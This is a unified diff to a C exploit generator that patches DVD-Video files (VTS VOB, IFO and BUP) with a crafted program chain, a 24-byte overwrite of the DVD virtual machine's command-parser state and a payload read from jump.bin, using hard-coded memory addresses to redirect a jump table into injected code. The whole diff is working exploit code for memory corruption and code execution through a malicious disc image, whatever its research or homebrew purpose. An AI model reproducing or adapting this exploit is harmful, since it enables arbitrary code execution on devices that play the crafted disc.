@@ -98,16 +98,16 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define IFO_CODE_PATCH_LOC 0x25c
 
 #define VM_CMD_PARSER_SWITCH_ADDR 0x00909208
-#define VM_CMD_PARSER_SWITCH_INDEX_ADDR 0x1558e4a
+#define VM_ADDR 0x01558e40
 #define CTRL_DATA_ADDR (0x155cec0 + 0x0c + 0x629)
 #define JUMP_POINTER 0x0090ec20
 #define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
 #define CMD_DATA_ADDR 0x01551da8
-#define NEEDED_LEN ((VM_CMD_PARSER_SWITCH_INDEX_ADDR - CMD_DATA_ADDR) + 2)
+#define NEEDED_LEN ((VM_ADDR - CMD_DATA_ADDR) + 24)
 #define INITIAL_COPY_BUF (0x1555608 + 0x10)
-#define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 2))
+#define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
 #define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
-#define EXEC_ADDR 0x015508e0
+#define EXEC_ADDR (CTRL_DATA_ADDR + 27)
 #define NEW_PGC_SECT "\x00\x00\x00\x2e"
 
 int main() {
@@ -117,27 +117,34 @@ int main() {
     if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
         return -1;
     }
-    uint8_t buf[4] = {
-        VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff,
-        (VM_CMD_PARSER_SWITCH_INDEX_VAL >> 8) & 0xff
+
+    uint8_t buf[24] = {
+        0x00, // VM_current_cmd_type_index
+        0x07, // VM_current_cmd_index
+        0x00, 0x00, // padding
+        0xa8, 0x1d, 0x55, 0x01, // VM_current_cmd_data
+        0x01, // DAT_01558e48
+        0x00, // padding
+        VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff, // FP_INDEX_lo
+        (VM_CMD_PARSER_SWITCH_INDEX_VAL >> 8) & 0xff, // FP_INDEX_lo_hi
+        0x01, 0x00, // VM_current_opcode_type
+        0x01, // VM_current_opcode_direct
+        0x00, // padding
+        0x00, 0x00, // VM_current_opcode_set
+        0x00, 0x00, // VM_current_opcode_dir_cmp
+        0x03, 0x00, // VM_current_opcode_cmp
+        0x02, 0x00 // VM_current_opcode_cmd
     };
 
-    FILE *fp = fopen("./build/fs/VIDEO_TS/VTS_01_1.VOB", "rb+");
-    if (!fp) {
-        return -1;
-    }
-    fseek(fp, VOB_PATCH_LOC, SEEK_SET);
-    fwrite(buf, 1, 2, fp);
-    fclose(fp);
-
-    fp = fopen("./build/jump.bin", "rb");
+    FILE *fp = fopen("./build/jump.bin", "rb");
     if (!fp) {
         return -1;
     }
     fseek(fp, 0, SEEK_END);
     uint32_t payload_len = ftell(fp);
-    if (payload_len > 186) {
-        payload_len = 186;
+    if (payload_len > 444) {
+        puts("payload truncated!");
+        payload_len = 444;
     }
     fseek(fp, 0, SEEK_SET);
     uint8_t *payload = malloc(payload_len);
@@ -147,16 +154,26 @@ int main() {
     fread(payload, 1, payload_len, fp);
     fclose(fp);
 
+    fp = fopen("./build/fs/VIDEO_TS/VTS_01_1.VOB", "rb+");
+    if (!fp) {
+        free(payload);
+        return -1;
+    }
+
+    fseek(fp, VOB_PATCH_LOC, SEEK_SET);
+    fwrite(buf, 1, 24, fp);
+    fseek(fp, VOB_PATCH_LOC + 27, SEEK_SET);
+    fwrite(payload, 1, payload_len, fp);
+    free(payload);
+    fclose(fp);
+
     fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
     if (!fp) {
         return -1;
     }
     fseek(fp, IFO_PGC_PATCH_LOC, SEEK_SET);
     fwrite(NEW_PGC_SECT, 1, 4, fp);
-    fseek(fp, IFO_CODE_PATCH_LOC, SEEK_SET);
-    fwrite(payload, 1, payload_len, fp);
     fclose(fp);
-    free(payload);
 
     puts("OK");
     return 0;
